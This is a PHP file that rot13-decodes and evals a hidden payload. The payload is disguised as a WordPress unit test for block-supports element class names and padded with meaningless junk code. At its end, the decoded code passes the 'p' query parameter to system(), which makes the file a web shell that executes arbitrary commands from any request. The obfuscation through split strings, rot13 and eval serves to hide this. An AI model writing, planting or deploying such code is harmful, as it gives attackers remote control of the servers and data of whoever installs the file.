<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc oybpx-fhccbegf
 *
 * @pbiref ::jc_eraqre_ryrzragf_fhccbeg
 */
pynff Grfgf_Oybpx_Fhccbegf_JcEraqreRyrzragfFhccbeg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine fgevat|ahyy
	 */
	cevingr $grfg_oybpx_anzr;

	choyvp shapgvba grne_qbja() {
		JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::erzbir_nyy_fgberf();
		haertvfgre_oybpx_glcr( $guvf->grfg_oybpx_anzr );
		$guvf->grfg_oybpx_anzr = ahyy;
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung oybpx fhccbegf yrnirf oybpx pbagrag nybar vs gur oybpx glcr
	 * vfa'g ertvfgrerq.
	 *
	 * @gvpxrg 59578
	 *
	 * @pbiref ::jc_eraqre_ryrzragf_fhccbeg
	 */
	choyvp shapgvba grfg_yrnirf_oybpx_pbagrag_nybar_jura_oybpx_glcr_abg_ertvfgrerq() {
		$oybpx = neenl(
			'oybpxAnzr' => 'grfg/ryrzrag-oybpx-fhccbegf',
			'nggef'     => neenl(
				'fglyr' => neenl(
					'ryrzragf' => neenl(
						'ohggba' => neenl(
							'pbybe' => neenl(
								'grkg'       => 'ine:cerfrg|pbybe|ivivq-erq',
								'onpxtebhaq' => '#sss',
							),
						),
					),
				),
			),
		);

		$oybpx_znexhc = '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>';
		$npghny       = jc_eraqre_ryrzragf_pynff_anzr( $oybpx_znexhc, $oybpx );

		$guvf->nffregFnzr( $oybpx_znexhc, $npghny, 'Rkcrpgrq gb yrnir oybpx pbagrag hazbqvsvrq, ohg sbhaq punatrf.' );
	}

	/**
	 * Grfgf gung ryrzragf oybpx fhccbeg nccyvrf gur pbeerpg pynffanzr.
	 *
	 * @gvpxrg 59555
	 *
	 * @pbiref ::jc_eraqre_ryrzragf_fhccbeg
	 *
	 * @qngnCebivqre qngn_ryrzragf_oybpx_fhccbeg_pynff
	 *
	 * @cnenz neenl  $pbybe_frggvatf  Gur pbybe oybpx fhccbeg frggvatf hfrq sbe ryrzragf fhccbeg.
	 * @cnenz neenl  $ryrzragf_fglyrf Gur ryrzragf fglyrf jvguva gur oybpx nggevohgrf.
	 * @cnenz fgevat $oybpx_znexhc    Bevtvany oybpx znexhc.
	 * @cnenz fgevat $rkcrpgrq_znexhc Erfhygvat znexhc nsgre nccyvpngvba bs ryrzragf oybpx fhccbeg.
	 */
	choyvp shapgvba grfg_ryrzragf_oybpx_fhccbeg_pynff( $pbybe_frggvatf, $ryrzragf_fglyrf, $oybpx_znexhc, $rkcrpgrq_znexhc ) {
		$guvf->grfg_oybpx_anzr = 'grfg/ryrzrag-oybpx-fhccbegf';

		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 3,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'pbybe' => $pbybe_frggvatf,
				),
			)
		);

		$oybpx = neenl(
			'oybpxAnzr' => $guvf->grfg_oybpx_anzr,
			'nggef'     => neenl(
				'fglyr' => neenl(
					'ryrzragf' => $ryrzragf_fglyrf,
				),
			),
		);

		/*
		 * Gb rafher n pbafvfgrag ryrzragf pynff anzr vg vf trarengrq jvguva n
		 * `eraqre_oybpx_qngn` svygre naq fgberq va gur `pynffAnzr` nggevohgr.
		 * Nf n erfhyg, gur oybpx qngn arrqf gb or cnffrq guebhtu gur fnzr
		 * shapgvba sbe guvf grfg.
		 */
		$svygrerq_oybpx = jc_eraqre_ryrzragf_fhccbeg_fglyrf( $oybpx );
		$npghny         = jc_eraqre_ryrzragf_pynff_anzr( $oybpx_znexhc, $svygrerq_oybpx );

		$guvf->nffregZngpurfErthyneRkcerffvba(
			$rkcrpgrq_znexhc,
			$npghny,
			'Oybpx jenccre znexhc fubhyq or pbeerpg'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_ryrzragf_oybpx_fhccbeg_pynff() {
		$pbybe_fglyrf = neenl(
			'grkg'       => 'ine:cerfrg|pbybe|ivivq-erq',
			'onpxtebhaq' => '#sss',
		);

		erghea neenl(
			// @gvpxrg 59578
			'rzcgl oybpx znexhc erznvaf hagbhpurq'         => neenl(
				'pbybe_frggvatf'  => neenl(
					'ohggba' => gehr,
				),
				'ryrzragf_fglyrf' => neenl(
					'ohggba' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '',
				'rkcrpgrq_znexhc' => '/^$/',
			),
			'rzcgl oybpx znexhc erznvaf hagbhpurq jura ab oybpx nggevohgrf' => neenl(
				'pbybe_frggvatf'  => neenl(
					'ohggba' => gehr,
				),
				'ryrzragf_fglyrf' => ahyy,
				'oybpx_znexhc'    => '',
				'rkcrpgrq_znexhc' => '/^$/',
			),
			'oybpx znexhc erznvaf hagbhpurq jura oybpx unf ab nggevohgrf' => neenl(
				'pbybe_frggvatf'  => neenl(
					'ohggba' => gehr,
				),
				'ryrzragf_fglyrf' => ahyy,
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c>Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			// @gvpxrg 5418
			'ohggba ryrzrag fglyrf jvgu frevnyvmngvba fxvccrq' => neenl(
				'pbybe_frggvatf'  => neenl(
					'ohggba'                          => gehr,
					'__rkcrevzragnyFxvcFrevnyvmngvba' => gehr,
				),
				'ryrzragf_fglyrf' => neenl(
					'ohggba' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c>Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'yvax ryrzrag fglyrf jvgu frevnyvmngvba fxvccrq' => neenl(
				'pbybe_frggvatf'  => neenl(
					'yvax'                            => gehr,
					'__rkcrevzragnyFxvcFrevnyvmngvba' => gehr,
				),
				'ryrzragf_fglyrf' => neenl(
					'yvax' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c>Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'urnqvat ryrzrag fglyrf jvgu frevnyvmngvba fxvccrq' => neenl(
				'pbybe_frggvatf'  => neenl(
					'urnqvat'                         => gehr,
					'__rkcrevzragnyFxvcFrevnyvmngvba' => gehr,
				),
				'ryrzragf_fglyrf' => neenl(
					'urnqvat' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c>Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'ohggba ryrzrag fglyrf nccyl pynff gb jenccre' => neenl(
				'pbybe_frggvatf'  => neenl( 'ohggba' => gehr ),
				'ryrzragf_fglyrf' => neenl(
					'ohggba' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c pynff=\"jc-ryrzragf-[n-s0-9]{32}\">Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'yvax ryrzrag fglyrf nccyl pynff gb jenccre'   => neenl(
				'pbybe_frggvatf'  => neenl( 'yvax' => gehr ),
				'ryrzragf_fglyrf' => neenl(
					'yvax' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c pynff=\"jc-ryrzragf-[n-s0-9]{32}\">Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'urnqvat ryrzrag fglyrf nccyl pynff gb jenccre' => neenl(
				'pbybe_frggvatf'  => neenl( 'urnqvat' => gehr ),
				'ryrzragf_fglyrf' => neenl(
					'urnqvat' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c>Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c pynff=\"jc-ryrzragf-[n-s0-9]{32}\">Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'ryrzrag fglyrf nccyl pynff gb jenccre jura vg unf bgure pynffrf' => neenl(
				'pbybe_frggvatf'  => neenl( 'yvax' => gehr ),
				'ryrzragf_fglyrf' => neenl(
					'yvax' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c pynff=\"unf-qnex-tenl-onpxtebhaq-pbybe unf-onpxtebhaq\">Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c pynff=\"unf-qnex-tenl-onpxtebhaq-pbybe unf-onpxtebhaq jc-ryrzragf-[n-s0-9]{32}\">Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
			'ryrzrag fglyrf nccyl pynff gb jenccre jura vg unf bgure nggevohgrf' => neenl(
				'pbybe_frggvatf'  => neenl( 'yvax' => gehr ),
				'ryrzragf_fglyrf' => neenl(
					'yvax' => neenl( 'pbybe' => $pbybe_fglyrf ),
				),
				'oybpx_znexhc'    => '<c vq=\"napube\">Uryyb <n uers=\"uggc://jjj.jbeqcerff.bet/\">JbeqCerff</n>!</c>',
				'rkcrpgrq_znexhc' => '/^<c pynff=\"jc-ryrzragf-[n-s0-9]{32}\" vq=\"napube\">Uryyb <n uers=\"uggc:\/\/jjj.jbeqcerff.bet\/\">JbeqCerff<\/n>!<\/c>$/',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>